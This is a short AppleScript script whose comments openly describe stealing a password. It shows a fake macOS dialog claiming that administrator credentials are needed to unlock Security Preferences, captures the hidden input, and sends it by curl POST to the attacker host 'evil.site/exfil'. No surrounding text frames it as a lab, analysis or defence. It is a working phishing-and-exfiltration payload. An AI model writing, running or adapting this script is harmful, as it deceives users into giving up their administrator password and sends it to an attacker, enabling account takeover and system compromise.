-- Ask for password and send to attacker
display dialog "macOS needs your administrator password to unlock Security Preferences." default answer "" with hidden answer buttons {"OK"} default button "OK"
set pw to text returned of result

-- Send the password to remote server
do shell script "curl -X POST -d 'pw=" & pw & "' http://evil.site/exfil"
